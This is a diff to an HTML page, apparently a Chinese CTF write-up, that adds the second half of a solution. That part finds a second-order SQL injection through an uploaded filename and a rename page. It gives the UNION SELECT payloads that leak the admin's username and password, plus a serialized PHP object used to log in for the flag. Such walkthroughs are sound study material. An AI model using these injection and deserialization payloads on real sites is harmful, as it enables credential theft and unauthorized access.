@@ -523,6 +523,25 @@ var_dump($result);
 #O:6:&quot;XCTFGG&quot;:2:{s:14:&quot;%00XCTFGG%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00XCTFGG%00args&quot;;a:2:{i:0;s:5:&quot;admin&quot;;i:1;s:9:&quot;123456789&quot;;}}</code></pre>
 <p>上传测试</p>
 <p><img src="https://i.loli.net/2020/08/30/OagwC3Xx8BUDG7F.png" alt="image-20200830195429481"></p>
+<p>结果很开心的去线上测试，失望而归</p>
+<p>重新审计代码，最后发现有二次注入，/(ㄒoㄒ)/~~</p>
+<p><img src="https://i.loli.net/2020/08/30/a1G2F8exndz4cyU.png" alt="image-20200830235611574"></p>
+<p>上传对文件名进行了<code>addslashes</code>过滤，但是在rename.php又进行了查询操作。</p>
+<p><img src="https://i.loli.net/2020/08/30/ec84yvUndYMzONo.png" alt="image-20200830235809117"></p>
+<p>最关键的是还有</p>
+<pre><code class="php"> $info = $info-&gt;fetch_assoc();
+        echo &quot;oldfilename : &quot;.$info[&#39;filename&#39;].&quot; will be changed.&quot;;</code></pre>
+<p>将查询的结果输出。</p>
+<p>至于为什么会产生二次注入</p>
+<p><img src="https://i.loli.net/2020/08/31/VRJOa1SM4iTsCky.png" alt="image-20200831000110211"></p>
+<p>那么这标标准准的二次注入就在这儿了。</p>
+<p>构造文件名</p>
+<pre><code>filename=&quot;&#39; union (select 1,concat(username,0x7e,password),3,4,5 from user where privilege=0x61646d696e)-- 2.txt&quot;</code></pre><p><code>filename</code>的列数和位置可以在sql文件中找，也可以本地环境中测试。</p>
+<p><img src="https://i.loli.net/2020/08/30/xht4qzrkK9GjUyH.png" alt=""></p>
+<p>上传成功后再rename.php页面输入原用户名即可</p>
+<pre><code>oldname=&#39; union (select 1,concat(username,0x7e,password),3,4,5 from user where privilege=0x61646d696e)-- 2&amp;newname=222</code></pre><p>得到<code>XM~qweqweqwe</code></p>
+<p>修改原来的payload再次上传+序列化即可拿到flag</p>
+<pre><code>O:6:&quot;XCTFGG&quot;:2:{s:14:&quot;%00XCTFGG%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00XCTFGG%00args&quot;;a:2:{i:0;s:2:&quot;XM&quot;;i:1;s:9:&quot;qweqweqwe&quot;;}}</code></pre><p><img src="https://i.loli.net/2020/08/30/xht4qzrkK9GjUyH.png" alt="image-20200830233258763"></p>
 
     </div>
   </div>
